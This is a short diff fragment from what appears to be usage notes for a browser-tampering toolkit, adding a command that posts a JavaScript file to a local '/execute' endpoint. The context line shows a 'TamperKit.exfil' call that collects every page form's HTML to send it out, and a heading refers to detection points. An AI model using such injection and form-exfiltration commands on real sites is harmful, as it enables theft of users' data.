@@ -96,6 +96,11 @@ echo 'TamperKit.exfil({type:"forms", data:Array.from(document.forms).map(f=>f.ou
   curl -X POST http://localhost:3000/execute \
     -H "Content-Type: application/json" -d @-
 
+Just change function:
+
+jq -n --rawfile code tamper_add_function.js '{code: $code}' | \
+  curl -X POST http://localhost:3000/execute \
+    -H "Content-Type: application/json" -d @-
 # ============================================================
 # TRAFFIC PRISM DETECTION POINTS
 # ============================================================
